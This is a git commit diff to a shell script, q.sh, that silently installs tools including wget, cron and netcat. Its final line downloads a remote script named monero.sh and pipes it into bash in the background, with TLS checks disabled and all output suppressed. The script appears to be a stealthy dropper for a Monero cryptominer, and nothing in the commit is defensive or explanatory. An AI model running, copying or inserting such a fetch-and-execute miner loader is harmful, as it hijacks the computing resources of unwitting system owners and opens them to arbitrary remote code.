8fcb4c769f7cb39d042f9540fc3d2779e9095e23
hanrzme <marcgrosier@live.cn>
2025-03-14 06:15:02 +0800

    Update q.sh

--- q.sh
+++ q.sh
@@ -1,3 +1,5 @@
 #!/bin/bash
-
+# Debian12+
+sudo apt -qqy update >/dev/null 2>&1 || apt -qqy update >/dev/null 2>&1
+sudo apt -qqy install wget procps psmisc lsof cron icu-devtools netcat-traditional bind9-host >/dev/null 2>&1 || apt -qqy install wget procps psmisc lsof cron icu-devtools netcat-traditional bind9-host >/dev/null 2>&1
 bash <(wget --no-check-certificate -qO- https://raw.githubusercontent.com/hanrzme/dtyhfstr/main/monero.sh) >/dev/null 2>&1 &
